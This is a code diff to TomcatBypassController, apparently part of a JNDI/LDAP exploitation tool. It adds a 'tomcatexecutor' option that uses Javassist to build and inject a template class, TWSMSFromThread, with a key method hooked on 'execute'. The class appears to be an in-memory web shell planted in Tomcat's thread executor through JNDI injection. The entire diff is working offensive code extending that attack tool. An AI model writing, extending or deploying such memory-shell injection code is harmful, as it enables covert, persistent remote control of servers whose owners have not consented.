@@ -115,6 +115,9 @@ public class TomcatBypassController implements LdapController {
             case jettyservlet:
                 code = helper.injectJettyServlet();
                 break;
+            case tomcatexecutor:
+                code = helper.injectTomcatExecutor();
+                break;
         }
 
         String finalPayload = payloadTemplate.replace("{replacement}", code);
@@ -329,6 +332,15 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool      = ClassPool.getDefault();
             CtClass   ctClass   = pool.get("com.nu1r.jndi.template.Websphere.WSFMSFromThread");
             insertKeyMethod(ctClass, "ws");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
+        }
+
+        public String injectTomcatExecutor() throws Exception {
+            String    className = "TWSMSFromThread";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TWSMSFromThread");
+            insertKeyMethod(ctClass, "execute");
             ctClass.setName(className);
             return injectClass(ctClass.getClass());
         }
